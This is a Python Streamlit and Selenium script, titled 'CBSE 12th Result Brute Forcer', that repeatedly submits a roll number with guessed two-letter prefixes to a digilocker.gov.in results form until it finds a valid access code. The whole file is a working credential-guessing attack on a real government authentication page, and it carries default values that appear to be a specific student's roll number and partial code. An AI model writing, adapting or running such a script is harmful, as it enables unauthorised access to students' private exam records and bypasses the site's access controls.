import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import string

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
DELAY_BETWEEN_ATTEMPTS = 3.5
# ============================================================

def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    return webdriver.Chrome(options=options)

def is_success(driver):
    """Same logic as your working local code"""
    try:
        try:
            error_elem = driver.find_element(By.ID, "err_msg")
            if error_elem.is_displayed() and error_elem.text.strip():
                return False
        except NoSuchElementException:
            pass
        
        try:
            success_indicators = ["marks", "result", "subject", "grade", "total"]
            page_text = driver.page_source.lower()
            if any(ind in page_text for ind in success_indicators):
                return True
        except:
            pass
            
        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
            return True
            
    except:
        pass
    return False


# ====================== STREAMLIT UI ======================
st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer")
st.markdown("### Edit the values below and click Start")

roll_number = st.text_input("Roll Number (Field 1)", value="18615900", help="Enter your roll number")
known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6, help="Enter the last 6 known digits/letters")
delay = st.slider("Delay between attempts (seconds)", 2.0, 6.0, DELAY_BETWEEN_ATTEMPTS, 0.5)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("❌ Last 6 characters must be exactly 6.")
    elif not roll_number:
        st.error("❌ Please enter Roll Number.")
    else:
        status = st.empty()
        progress = st.empty()
        result_box = st.empty()

        driver = None
        try:
            driver = get_driver()
            driver.get(URL)
            status.success("✅ Page loaded successfully. Starting brute force...")

            letters = string.ascii_uppercase
            count = 0

            for first in letters:
                for second in letters:
                    code = f"{first}{second}{known_last_6}"
                    attempt = f"{first}{second}"
                    count += 1

                    progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")

                    try:
                        driver.find_element(By.ID, "rroll").clear()
                        driver.find_element(By.ID, "rroll").send_keys(roll_number)

                        driver.find_element(By.ID, "admn_id").clear()
                        driver.find_element(By.ID, "admn_id").send_keys(code)

                        driver.find_element(By.ID, "submit").click()
                        time.sleep(delay)

                        if is_success(driver):
                            result_box.success(f"""
                            🎉 **SUCCESS FOUND!**

                            **Full Code:** `{code}`
                            **Prefix:** `{attempt}`
                            """)
                            st.balloons()
                            break
                    except:
                        continue
            else:
                st.error("❌ Finished all 676 attempts without finding the correct code.")

        except Exception as e:
            st.error(f"Error: {str(e)}")
        finally:
            if driver:
                driver.quit()
